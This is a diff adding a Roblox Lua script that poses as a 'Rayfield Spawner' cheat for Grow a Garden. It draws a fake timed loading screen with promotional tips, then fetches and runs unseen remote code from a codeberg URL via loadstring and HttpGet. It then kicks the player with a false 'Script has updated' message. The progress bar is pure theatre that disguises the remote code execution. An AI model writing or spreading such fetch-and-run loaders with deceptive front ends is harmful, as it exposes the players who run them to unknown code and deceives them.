@@ -1,0 +1,131 @@
+-- Create ScreenGui
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "RayfieldLoadingScreen"
+screenGui.IgnoreGuiInset = true
+screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+screenGui.Parent = game:GetService("CoreGui")
+
+-- Full black background
+local background = Instance.new("Frame")
+background.Size = UDim2.new(1, 0, 1, 0)
+background.BackgroundColor3 = Color3.new(0, 0, 0)
+background.BorderSizePixel = 0
+background.Parent = screenGui
+
+-- Create moving circles for background effect
+for i = 1, 20 do
+	local circle = Instance.new("Frame")
+	circle.Size = UDim2.new(0, math.random(30, 60), 0, math.random(30, 60))
+	circle.Position = UDim2.new(math.random(), 0, math.random(), 0)
+	circle.BackgroundColor3 = Color3.fromRGB(math.random(50,255), math.random(50,255), math.random(50,255))
+	circle.BackgroundTransparency = 0.9
+	circle.BorderSizePixel = 0
+	circle.Parent = background
+
+	-- Animate
+	game:GetService("TweenService"):Create(
+		circle,
+		TweenInfo.new(math.random(20,40), Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true),
+		{Position = UDim2.new(math.random(),0,math.random(),0)}
+	):Play()
+end
+
+-- Bold all-caps loading text
+local loadingLabel = Instance.new("TextLabel")
+loadingLabel.Size = UDim2.new(1,0,0,60)
+loadingLabel.Position = UDim2.new(0,0,0.4,0)
+loadingLabel.Text = "RAYFIELD SCRIPT IS GENERATING, PLEASE WAIT..."
+loadingLabel.TextColor3 = Color3.fromRGB(0,255,255)
+loadingLabel.Font = Enum.Font.GothamBlack
+loadingLabel.TextSize = 32
+loadingLabel.TextStrokeTransparency = 0
+loadingLabel.BackgroundTransparency = 1
+loadingLabel.Parent = screenGui
+
+-- Progress bar background
+local barBG = Instance.new("Frame")
+barBG.Size = UDim2.new(0.6,0,0,20)
+barBG.Position = UDim2.new(0.2,0,0.5,0)
+barBG.BackgroundColor3 = Color3.fromRGB(50,50,50)
+barBG.BorderSizePixel = 0
+barBG.Parent = screenGui
+
+-- Progress bar fill
+local barFill = Instance.new("Frame")
+barFill.Size = UDim2.new(0,0,1,0)
+barFill.BackgroundColor3 = Color3.fromRGB(0,255,255)
+barFill.BorderSizePixel = 0
+barFill.Parent = barBG
+
+-- % label
+local percentLabel = Instance.new("TextLabel")
+percentLabel.Size = UDim2.new(0.6,0,0,30)
+percentLabel.Position = UDim2.new(0.2,0,0.53,0)
+percentLabel.Text = "0%"
+percentLabel.TextColor3 = Color3.new(1,1,1)
+percentLabel.Font = Enum.Font.GothamBold
+percentLabel.TextSize = 20
+percentLabel.BackgroundTransparency = 1
+percentLabel.Parent = screenGui
+
+-- Rotating tips label
+local tipsLabel = Instance.new("TextLabel")
+tipsLabel.Size = UDim2.new(1,0,0,30)
+tipsLabel.Position = UDim2.new(0,0,0.6,0)
+tipsLabel.Text = ""
+tipsLabel.TextColor3 = Color3.fromRGB(255,255,255)
+tipsLabel.Font = Enum.Font.Gotham
+tipsLabel.TextSize = 18
+tipsLabel.BackgroundTransparency = 1
+tipsLabel.Parent = screenGui
+
+local tips = {
+	"WORKS BETTER IF YOU'RE IN A PUBLIC SERVER",
+	"SCRIPT IS GENERATING THE UI, PLEASE WAIT",
+	"FOLLOW @GAG_SCRIPTVSH ON TIKTOK",
+	"RAYFIELD SPAWNER IS ONE OF A KIND",
+	"SCRIPTS CONTAIN A KEY",
+	"DO NOT LEAVE IF YOU DON'T WANT TO RESTART"
+}
+
+-- Animate RGB progress bar and % over 20 seconds
+local totalTime = 20
+local elapsed = 0
+local currentTip = 1
+local nextTipTime = 0
+
+spawn(function()
+	while elapsed < totalTime do
+		wait(0.1)
+		elapsed = elapsed + 0.1
+		local pct = math.clamp(elapsed/totalTime,0,1)
+		barFill.Size = UDim2.new(pct,0,1,0)
+		barFill.BackgroundColor3 = Color3.fromHSV(tick()%5/5,1,1)
+		percentLabel.Text = string.format("%d%%", math.floor(pct*100))
+
+		-- Change tips every 5 seconds
+		if elapsed >= nextTipTime then
+			tipsLabel.Text = tips[currentTip]
+			currentTip = currentTip + 1
+			if currentTip > #tips then currentTip = 1 end
+			nextTipTime = elapsed + 5
+		end
+	end
+
+	-- 100% done
+	percentLabel.Text = "100%"
+	loadingLabel.Text = "SCRIPT LOADED, STARTING..."
+
+	wait(2)
+
+	-- Remove loading screen
+	screenGui:Destroy()
+
+	-- Execute your new script
+local Spawner = loadstring(game:HttpGet("https://codeberg.org/GrowAFilipino/GrowAGarden/raw/branch/main/Spawner.lua"))()
+Spawner.Load()
+
+	-- Wait 15 sec then kick
+	wait(15)
+	game.Players.LocalPlayer:Kick("Script has updated! Re execute.")
+end)
